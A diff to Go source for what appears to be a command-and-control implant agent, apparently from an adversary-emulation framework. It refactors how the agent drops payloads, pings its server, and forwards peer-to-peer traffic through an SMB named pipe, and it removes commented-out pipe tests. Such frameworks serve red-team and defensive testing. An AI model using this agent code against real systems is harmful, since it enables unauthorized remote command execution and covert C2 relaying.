@@ -40,7 +40,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				fmt.Printf("[*] Running instruction %s\n", command["id"])
-				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string))
+				payloads := coms.DropPayloads(profile, command["payload"].(string))
 				go coms.RunInstruction(command, profile, payloads)
 				util.Sleep(command["sleep"].(float64))
 			}
@@ -96,20 +96,11 @@ func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[str
 		coms, _ = contact.CommunicationChannels[profile["c2"].(string)]
 	}
 
-	if coms.Ping(profile["server"].(string)) {
-		//go util.StartProxy(profile["server"].(string))
-		//go util.TestLocalListenDialReadWrite("\\\\.\\pipe\\mytestpipe")
-		//go util.TestListenDialReadWrite("\\\\.\\pipe\\mytestpipe")
-
+	if coms.Ping(profile) {
         if len(profile["localPipePath"].(string)) > 0 {
-            output.VerbosePrint("[*] GOING TO TEST RECEIVING DATA FROM SMB PIPE")
-		    go util.StartNamedPipeForwarder(profile["localPipePath"].(string), profile["server"].(string), "http")
+            output.VerbosePrint("[*] SETTING UP SMB PIPE TO FORWARD P2P")
+		    go util.StartNamedPipeForwarder(profile["localPipePath"].(string), profile["server"].(string), profile["c2"].(string))
         }
-
-        //if len(profile["upstreamPipePath"].(string)) > 0 {
-           // output.VerbosePrint("[*] GOING TO TEST SENDING DATA TO SMB PIPE")
-            //util.SendDataToPipe(profile["upstreamPipePath"].(string), []byte("Hello world"), false)
-		//}
 
 		return coms
 	}
